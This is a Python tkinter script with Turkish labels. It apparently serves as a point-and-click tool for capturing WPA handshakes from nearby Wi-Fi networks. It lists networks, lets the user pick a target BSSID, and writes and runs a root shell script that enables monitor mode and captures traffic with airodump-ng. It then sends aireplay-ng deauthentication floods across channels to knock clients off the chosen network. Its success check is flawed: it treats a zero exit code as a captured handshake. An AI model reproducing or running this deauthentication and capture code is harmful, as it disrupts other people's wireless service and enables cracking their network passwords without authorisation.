from tkinter import *
from tkinter import ttk, messagebox
import subprocess
import os

def komut():
    def get_wifi_list_lines():
        """Wi-Fi ağlarının listesini almak için nmcli komutunu çalıştırır ve sonuçları döndürür."""
        try:
            # nmcli komutunu çalıştır ve çıktıyı yakala
            result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, check=True)
            wifi_list = result.stdout.split('\n')  # Çıktıyı satır satır böl
            # Her satırın ilk 25 karakterini al ve temizle
            lines = [line[:25].strip() for line in wifi_list[1:] if line.strip()]
            # Wi-Fi ağlarını gösteren bir terminal aç
            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', 'nmcli dev wifi list'])
            return lines
        except subprocess.CalledProcessError:
            # Eğer komut başarısız olursa hata mesajı göster
            messagebox.showerror("Hata", "Ağ arayüzleri listelenemedi.")
            return []

    def populate_combobox():
        """Wi-Fi ağlarını ComboBox'a ekler."""
        lines = get_wifi_list_lines()
        if lines:
            combo1['values'] = lines
            combo1.current(0)  # İlk öğeyi seç

    # Hedef BSSID'yi seçmek için etiket ve ComboBox
    label2 = Label(pencere1, text="Hedef BSSID'yi seçiniz")
    label2.pack()
    combo1 = ttk.Combobox(pencere1)
    combo1.pack()
    populate_combobox()

    def sec():
        """Seçilen BSSID'yi alır ve airmon-ng ile ilgili komutları çalıştırır."""
        hedef_bssid = combo1.get().strip().replace(" ", "")
        print(hedef_bssid)

        # Betik içeriğini oluştur
        script_content = f"""
        #!/bin/bash
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo gnome-terminal -- bash -c "airodump-ng --bssid {hedef_bssid} wlan0mon -w /tmp/handshake_capture; exec bash"
        """
        
        script_path = "/tmp/start_airmon.sh"
        
        with open(script_path, "w") as script_file:
            script_file.write(script_content)
        
        os.chmod(script_path, 0o755)
        
        try:
            result = subprocess.run(["sudo", script_path], capture_output=True, text=True, check=True)

            def deauthh():
                bssid = hedef_bssid
                print(bssid)
                output = ""
                for channel in range(1, 15):  # 1'den 14'e kadar tüm kanalları dene
                    try:
                        subprocess.run(["sudo", "iwconfig", "wlan0mon", "channel", str(channel)], check=True)
                        result = subprocess.run(
                            ["sudo", "aireplay-ng", "--deauth", "100", "-a", bssid, "wlan0mon"], 
                            capture_output=True, text=True, check=True
                        )
                        output += result.stdout
                        if result.returncode == 0:
                            messagebox.showinfo("Tebrikler", "Handshake yakalanmıştır, görmek için aşağıdaki butona tıklayın")
                            break
                    except subprocess.CalledProcessError as e:
                        print(f"Kanal {channel} başarısız: {e}")
                        output += str(e)
                else:
                    messagebox.showerror("Hata", "Deauth saldırısı başlatılamadı.")
            buton2 = Button(pencere1, text="Deauth Başlat", command=deauthh)
            buton2.pack()
        except subprocess.CalledProcessError:
            messagebox.showerror("Hata", "Komut çalıştırılamadı")

    button1 = Button(pencere1, text="Hedefi Seç", command=sec)
    button1.pack()

# Ana pencere oluşturuluyor
pencere1 = Tk()
pencere1.geometry("600x400")
pencere1.title("Handshake Yakalama")

# Etiket ve buton ekleniyor
label1 = Label(pencere1, text="Handshake yakalamak istediğiniz ağı seçin:")
label1.pack()

button1 = Button(pencere1, text="Ağları Görmek İçin Tıkla", command=komut)
button1.pack()

# Pencereyi çalıştır
pencere1.mainloop()
